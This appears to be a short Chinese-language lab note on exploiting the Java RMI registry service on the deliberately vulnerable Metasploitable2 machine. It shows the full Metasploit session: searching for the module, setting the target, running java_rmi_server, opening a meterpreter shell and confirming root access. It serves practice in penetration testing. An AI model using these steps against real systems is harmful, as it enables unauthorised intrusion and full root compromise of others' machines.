##rmiregistry服务漏洞

1、继续查看开放的端口，发现rmiregistry这个服务，搜索一下
```bash
msf > search rmiregistry
Matching Modules
================

   Name                                Disclosure Date  Rank       Description
   ----                                ---------------  ----       -----------
   exploit/multi/misc/java_rmi_server  2011-10-15       excellent  Java RMI Server Insecure Default Configuration Java Code Execution

#居然有一个，是java rmi server 
#use看一下
msf > use exploit/multi/misc/java_rmi_server
msf exploit(java_rmi_server) > set RHOST metasploitable2
msf exploit(java_rmi_server) > show options
Module options (exploit/multi/misc/java_rmi_server):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request
   RHOST      metasploitable2  yes       The target address
   RPORT      1099             yes       The target port
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL for incoming connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                     no        The URI to use for this exploit (default is random)


Exploit target:

   Id  Name
   --  ----
   0   Generic (Java Payload)

msf exploit(java_rmi_server) > exploit
meterpreter > shell
Process 1 created.
Channel 1 created.
id
uid=0(root) gid=0(root)
#看，root权限了。。。
```